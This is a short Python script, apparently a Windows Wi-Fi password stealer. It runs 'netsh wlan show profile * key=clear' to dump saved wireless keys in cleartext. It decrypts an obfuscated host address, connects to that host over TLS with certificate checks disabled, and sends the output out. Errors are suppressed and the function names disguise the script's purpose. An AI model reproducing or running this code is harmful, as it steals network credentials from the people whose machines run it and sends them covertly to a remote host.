import subprocess
import threading
import warnings
from CryptoPhenix import decrypt

# Autor   ->  an0mal1a
# Name    ->  Pablo
# GitHub  ->  https://github.com/an0mal1a
# Correo  -> pablodiez024@proton.me


warnings.filterwarnings("ignore", category=DeprecationWarning)
points = subprocess.Popen(["NETSH", "WLAN", "SHOW", "PROFILE", "*", "KEY=CLEAR"], stdout=subprocess.PIPE, shell=True)


def know_gme():
    unkown = b'\x1fZ\x13t\x03\xabNf\xa7\xa0Pw\xccts\x88?3\x84,\xc4`\\\x9fj\x15\x0b\x99H)\xeb\x93\x05*\xa2-\x8f\xdd\x05&\x90\xdc\xfb\t\xc2P\xfc\xd5\x04\xbdOuX<\xfb\xb0\xc2\n\xec\xc3\x8f\x7f\x85\x03'
    return str(decrypt(unkown).decode())
    #return "127.0.0.1"


def get_points():
    encodings = ["utf-8", "latin-1", "ascii"]  # Lista de codificaciones a probar
    for line in points.stdout:
        for encoding in encodings:
            try:
                point = line.rstrip().decode(encoding)
                print(point)
            except UnicodeDecodeError:
                continue

        else:
            # Si ninguna codificación funciona, utilizar una codificación por defecto o ignorar el error
            decoded_line = line.rstrip().decode(errors="ignore")
            print(decoded_line)


def use_points(sec):
    for line in points.stdout:
        sec.send(line)


def main(sec):

    # Definimos el primer hilo para leer la salida del comando
    get = threading.Thread(target=use_points(sec))

    # Iniciamos los hilos
    get.start()

    # Los juntamos para su uso
    get.join()


def all_right():
    import certs
    import socket
    import tempfile
    import ssl

    cock = tempfile.NamedTemporaryFile(delete=False)
    cock.write(certs.get_crte().encode())
    cock.close()

    csd = tempfile.NamedTemporaryFile(delete=False)
    csd.write(certs.get_locker().encode())
    csd.close()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.load_cert_chain(certfile=cock.name, keyfile=csd.name)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((know_gme(), 5002))

    sec = context.wrap_socket(sock, server_hostname=know_gme())

    main(sec)



if __name__ == "__main__":
    try:
        all_right()
    except Exception:
        pass